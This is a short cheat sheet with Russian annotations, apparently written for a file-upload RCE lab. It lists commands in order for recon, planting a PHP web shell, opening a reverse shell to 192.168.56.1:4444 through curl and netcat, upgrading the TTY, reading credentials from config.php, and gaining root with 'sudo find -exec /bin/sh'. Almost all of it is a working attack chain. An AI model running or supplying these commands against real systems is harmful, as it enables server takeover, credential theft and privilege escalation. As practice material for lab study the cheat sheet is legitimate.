# Commands List

## Recon

```
nmap -sC -sV -p- your_lab_ip_address
```

Сканирование всех портов, определение сервисов и запуск стандартных скриптов для поиска уязвимостей

```
gobuster dir -u http://your_lab_ip_address -w /usr/share/wordlists/dirb/common.txt
```

Перебор директорий на веб сервере для поиска скрытых путей

---

## Web Shell

```
nano shell.php
```

Создание web shell файла

```
<?php system($_GET['cmd']); ?>
```

PHP код для выполнения команд через параметр cmd

```
curl "http://your_lab_ip_address/uploads/shell.php?cmd=id"
```

Проверка выполнения команд на сервере

---

## Reverse Shell

```
nc -lvnp 4444
```

Запуск listener для получения обратного подключения

```
curl -G "http://your_lab_ip_address/uploads/shell.php" --data-urlencode "cmd=php -r '$sock=fsockopen("192.168.56.1",4444);exec("/bin/sh -i <&3 >&3 2>&3");'"
```

Корректная отправка payload с автоматическим кодированием

---

## TTY Upgrade

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
CTRL + Z
stty raw -echo
fg
export TERM=xterm
tty
```

---

## Enumeration

```
whoami id sudo -l
find / -type f -perm -4000 2>/dev/null
```

---

## Navigation

```
cd ..
ls
```

---

## Credentials

```
cat /var/www/html/file-upload-rce-lab/config.php
```

---

## Privilege Escalation

```
su dev
sudo -l
sudo find . -exec /bin/sh ; -quit
whoami
```
